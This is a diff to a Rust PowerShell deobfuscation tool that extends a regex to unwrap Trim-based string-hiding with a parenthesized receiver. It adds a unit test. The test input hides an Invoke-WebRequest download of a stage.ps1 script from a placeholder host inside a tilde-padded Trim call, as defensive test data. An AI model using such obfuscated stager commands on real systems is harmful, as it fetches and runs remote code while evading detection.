@@ -970,7 +970,7 @@ static PS_LITERAL_DOT_REPLACE_EXTRACTOR_BODY_RE: Lazy<Regex> = Lazy::new(|| {
 #[allow(clippy::expect_used)]
 static PS_LITERAL_TRIM_EXTRACTOR_BODY_RE: Lazy<Regex> = Lazy::new(|| {
     Regex::new(
-        r#"(?is)(?:\breturn\s+)?\$([A-Za-z_][A-Za-z0-9_]*)\s*\.\s*(Trim(?:Start|End)?)\s*\(\s*(?:\$([A-Za-z_][A-Za-z0-9_]*))?\s*\)"#,
+        r#"(?is)(?:\breturn\s+)?(?:\(\s*)?\$([A-Za-z_][A-Za-z0-9_]*)\s*(?:\)\s*)?\.\s*(Trim(?:Start|End)?)\s*\(\s*(?:\$([A-Za-z_][A-Za-z0-9_]*))?\s*\)"#,
     )
     .expect("ps literal trim extractor body regex")
 });
@@ -6623,6 +6623,23 @@ Clean '~~~Invoke-WebRequest -Uri https://ps-param-block-extractor.example/stage.
                 "'Invoke-WebRequest -Uri https://ps-param-block-extractor.example/stage.ps1'"
             ),
             "param-block trim extractor call was not rewritten:\n{out}"
+        );
+    }
+
+    #[test]
+    fn literal_parenthesized_receiver_trim_extractor_call_is_rewritten() {
+        let text = r#"function Clean($value,$chars) {
+  return ($value).Trim($chars)
+}
+Clean '~~~Invoke-WebRequest -Uri https://ps-paren-receiver-extractor.example/stage.ps1~~~' '~'"#;
+
+        let out = expand_literal_trim_extractor_calls(text);
+
+        assert!(
+            out.contains(
+                "'Invoke-WebRequest -Uri https://ps-paren-receiver-extractor.example/stage.ps1'"
+            ),
+            "parenthesized-receiver trim extractor call was not rewritten:\n{out}"
         );
     }
 
